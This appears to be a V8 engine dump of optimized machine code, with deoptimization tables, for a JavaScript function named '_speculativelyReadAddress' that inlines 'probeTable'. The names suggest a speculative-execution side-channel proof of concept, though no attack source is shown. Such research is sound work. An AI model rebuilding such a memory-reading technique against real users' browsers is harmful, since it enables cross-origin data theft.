0x622d186db04   344  48be81476012c0080000 REX.W movq rsi,0x8c012604781    ;; object: 0x08c012604781 <Map(UINT8_ELEMENTS)>
0x622d186db0e   34e  49bb59d9293b97360000 REX.W movq r11,0x36973b29d959    ;; object: 0x36973b29d959 <Uint8Array map = 0x8c012604781>
0x622d186db18   358  4c8b4dd0       REX.W movq r9,[rbp-0x30]
0x622d186db1c   35c  e959feffff     jmp 0x622d186d97a  <+0x1ba>
                  -- B29 start (deferred) --
0x622d186db21   361  4c8945c8       REX.W movq [rbp-0x38],r8
0x622d186db25   365  4c8b55e0       REX.W movq r10,[rbp-0x20]
0x622d186db29   369  4c8955d0       REX.W movq [rbp-0x30],r10
0x622d186db2d   36d  4c897dd8       REX.W movq [rbp-0x28],r15
0x622d186db31   371  48897de0       REX.W movq [rbp-0x20],rdi
0x622d186db35   375  e936000000     jmp 0x622d186db70  <+0x3b0>
                  -- B30 start (deferred) --
0x622d186db3a   37a  4c8975a8       REX.W movq [rbp-0x58],r14
0x622d186db3e   37e  48894dc8       REX.W movq [rbp-0x38],rcx
0x622d186db42   382  4c897dd0       REX.W movq [rbp-0x30],r15
0x622d186db46   386  4c8b55d8       REX.W movq r10,[rbp-0x28]
0x622d186db4a   38a  4c8955e0       REX.W movq [rbp-0x20],r10
0x622d186db4e   38e  488945d8       REX.W movq [rbp-0x28],rax
0x622d186db52   392  e961000000     jmp 0x622d186dbb8  <+0x3f8>
                  -- B31 start (deferred) --
0x622d186db57   397  48c745d800000000 REX.W movq [rbp-0x28],0x0
0x622d186db5f   39f  4c8965e0       REX.W movq [rbp-0x20],r12
0x622d186db63   3a3  b806000000     movl rax,0x6
0x622d186db68   3a8  48894dc8       REX.W movq [rbp-0x38],rcx
0x622d186db6c   3ac  488945d0       REX.W movq [rbp-0x30],rax
                  -- B32 start (deferred) --
0x622d186db70   3b0  48b8315cf983272c0000 REX.W movq rax,0x2c2783f95c31    ;; object: 0x2c2783f95c31 <String[4]: junk>
0x622d186db7a   3ba  50             push rax
                  -- <not inlined:1723> --
0x622d186db7b   3bb  48bb108c190100000000 REX.W movq rbx,0x1198c10
0x622d186db85   3c5  b801000000     movl rax,0x1
0x622d186db8a   3ca  488b75e8       REX.W movq rsi,[rbp-0x18]
0x622d186db8e   3ce  e86d1ff6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
                  -- B33 start (deferred) --
0x622d186db93   3d3  48c745e000000000 REX.W movq [rbp-0x20],0x0
0x622d186db9b   3db  b806000000     movl rax,0x6
0x622d186dba0   3e0  488955a8       REX.W movq [rbp-0x58],rdx
0x622d186dba4   3e4  48c745d800000000 REX.W movq [rbp-0x28],0x0
0x622d186dbac   3ec  48c745d000000000 REX.W movq [rbp-0x30],0x0
0x622d186dbb4   3f4  488945c8       REX.W movq [rbp-0x38],rax
                  -- B34 start (deferred) --
0x622d186dbb8   3f8  48b8315cf983272c0000 REX.W movq rax,0x2c2783f95c31    ;; object: 0x2c2783f95c31 <String[4]: junk>
0x622d186dbc2   402  50             push rax
                  -- <not inlined:1314> --
0x622d186dbc3   403  488b1db3ffffff REX.W movq rbx,[rip+0xffffffb3]
0x622d186dbca   40a  b801000000     movl rax,0x1
0x622d186dbcf   40f  488b75e8       REX.W movq rsi,[rbp-0x18]
0x622d186dbd3   413  e8281ff6ff     call 0x622d17cfb00  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; code: Builtin::CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
0x622d186dbd8   418  90             nop
0x622d186dbd9   419  e862640900     call 0x622d1904040       ;; debug: deopt position, script offset '359'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 0
                                                             ;; lazy deoptimization bailout 0
0x622d186dbde   41e  e862640900     call 0x622d1904045       ;; debug: deopt position, script offset '879'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 1
                                                             ;; lazy deoptimization bailout 1
0x622d186dbe3   423  e862640100     call 0x622d188404a       ;; debug: deopt position, script offset '1336'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 2
                                                             ;; eager deoptimization bailout 2
0x622d186dbe8   428  e862640100     call 0x622d188404f       ;; debug: deopt position, script offset '1461'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 3
                                                             ;; eager deoptimization bailout 3
0x622d186dbed   42d  e862640100     call 0x622d1884054       ;; debug: deopt position, script offset '1461'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 4
                                                             ;; eager deoptimization bailout 4
0x622d186dbf2   432  e862640100     call 0x622d1884059       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 5
                                                             ;; eager deoptimization bailout 5
0x622d186dbf7   437  e862640100     call 0x622d188405e       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 6
                                                             ;; eager deoptimization bailout 6
0x622d186dbfc   43c  e862640100     call 0x622d1884063       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 7
                                                             ;; eager deoptimization bailout 7
0x622d186dc01   441  e862640100     call 0x622d1884068       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 8
                                                             ;; eager deoptimization bailout 8
0x622d186dc06   446  e862640100     call 0x622d188406d       ;; debug: deopt position, script offset '1336'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'not a Smi'
                                                             ;; debug: deopt index 9
                                                             ;; eager deoptimization bailout 9
0x622d186dc0b   44b  e862640100     call 0x622d1884072       ;; debug: deopt position, script offset '1461'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 10
                                                             ;; eager deoptimization bailout 10
0x622d186dc10   450  e862640100     call 0x622d1884077       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 11
                                                             ;; eager deoptimization bailout 11
0x622d186dc15   455  e862640100     call 0x622d188407c       ;; debug: deopt position, script offset '1550'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 12
                                                             ;; eager deoptimization bailout 12
0x622d186dc1a   45a  e862640100     call 0x622d1884081       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'wrong map'
                                                             ;; debug: deopt index 13
                                                             ;; eager deoptimization bailout 13
0x622d186dc1f   45f  e862640100     call 0x622d1884086       ;; debug: deopt position, script offset '1742'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason 'out of bounds'
                                                             ;; debug: deopt index 14
                                                             ;; eager deoptimization bailout 14
0x622d186dc24   464  e862640900     call 0x622d190408b       ;; debug: deopt position, script offset '330'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 15
                                                             ;; lazy deoptimization bailout 15
0x622d186dc29   469  e862640900     call 0x622d1904090       ;; debug: deopt position, script offset '799'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 16
                                                             ;; lazy deoptimization bailout 16
0x622d186dc2e   46e  e862640900     call 0x622d1904095       ;; debug: deopt position, script offset '918'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 17
                                                             ;; lazy deoptimization bailout 17
0x622d186dc33   473  e862640900     call 0x622d190409a       ;; debug: deopt position, script offset '918'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 18
                                                             ;; lazy deoptimization bailout 18
0x622d186dc38   478  e862640900     call 0x622d190409f       ;; debug: deopt position, script offset '1723'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 19
                                                             ;; lazy deoptimization bailout 19
0x622d186dc3d   47d  e862640900     call 0x622d19040a4       ;; debug: deopt position, script offset '1314'
                                                             ;; debug: deopt position, inlining id '-1'
                                                             ;; debug: deopt reason '(unknown)'
                                                             ;; debug: deopt index 20
                                                             ;; lazy deoptimization bailout 20
0x622d186dc42   482  6690           nop
                  ;;; Safepoint table.

Source positions:
 pc offset  position
         0       330
        29       359
        60       817
        6f       799
        7c       879
        a9       918
        ba      1314
        d2      1336
        e2      1319
        ed      1461
       119      1550
       14b      1723
       15d      1742
       18c      1728
       1a0       950
       1ad       918
       1ba      1058
       1c5      1314
       1c9      1175
       1d0      1111
       1d7      1314
       1e5      1336
       1ff      1723
       206      1319
       20a      1461
       222      1483
       22c      1550
       254      1723
       25e      1742
       268      1746
       26b      1742
       26f      1762
       273      1742
       27b      1780
       281      1742
       297      1728
       29f       957
       2af       846
       2bb      1871
       2c6       330
       2e0       799
       2fd       918
       3bb      1723
       403      1314

Inlined functions (count = 1)
 0x2c2783f96121 <SharedFunctionInfo probeTable>

Deoptimization Input Data (deopt points = 21)
 index  bytecode-offset    pc  commands
     0              689    56  BEGIN {frame count=3, js frame count=2, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=30, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               CONSTRUCT_STUB_FRAME {bailout_id=2, function=0x2b18c9505449 <String[10]: Uint8Array>, height=2}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=5 (1542000)}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME {bailout_id=689, function=0x2b18c9505449 <String[10]: Uint8Array>, height=4}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=6 (0x2b18c9502691 <the_hole>)}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=7 (0x2b18c95025b1 <undefined>)}
                               LITERAL {literal_id=8 (1)}
                               STACK_SLOT {input=4}
     1              689    a9  BEGIN {frame count=3, js frame count=2, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=66, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               CONSTRUCT_STUB_FRAME {bailout_id=2, function=0x2b18c9505449 <String[10]: Uint8Array>, height=2}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=9 (12000)}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               JAVA_SCRIPT_BUILTIN_CONTINUATION_FRAME {bailout_id=689, function=0x2b18c9505449 <String[10]: Uint8Array>, height=4}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=6 (0x2b18c9502691 <the_hole>)}
                               LITERAL {literal_id=4 (0x3b2a3bd127e9 <JSFunction Uint8Array (sfi = 0x18d859c94b01)>)}
                               LITERAL {literal_id=7 (0x2b18c95025b1 <undefined>)}
                               LITERAL {literal_id=8 (1)}
                               STACK_SLOT {input=4}
     2               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=10 (6)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
     3              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=10 (6)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
     4              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=10 (6)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
     5              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=10 (6)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
     6              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=10 (6)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
     7              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=10 (6)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=10}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
     8              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=11 (0)}
                               LITERAL {literal_id=10 (6)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=10}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
     9               80    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=5}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=11 (0)}
    10              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r12}
                               INT32_REGISTER {input=rax}
                               INT32_REGISTER {input=r15}
                               INT32_STACK_SLOT {input=5}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r15}
    11              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r12}
                               INT32_REGISTER {input=rax}
                               INT32_REGISTER {input=r15}
                               INT32_STACK_SLOT {input=5}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r15}
    12              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=6}
                               INT32_REGISTER {input=rax}
                               INT32_REGISTER {input=r15}
                               INT32_STACK_SLOT {input=5}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r15}
    13              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=6}
                               INT32_REGISTER {input=rax}
                               INT32_REGISTER {input=r15}
                               INT32_STACK_SLOT {input=5}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r15}
    14              148    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=148, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=6}
                               INT32_REGISTER {input=rax}
                               INT32_REGISTER {input=r15}
                               INT32_STACK_SLOT {input=5}
                               STACK_SLOT {input=9}
                               INT32_STACK_SLOT {input=10}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_REGISTER {input=r15}
    15                0   2db  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=0, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
    16               49   2f2  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=49, function=0x2c2783f95d59 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=4}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=10}
                               STACK_SLOT {input=11}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x2b18c9502f39 <Odd Oddball: optimized_out>)}
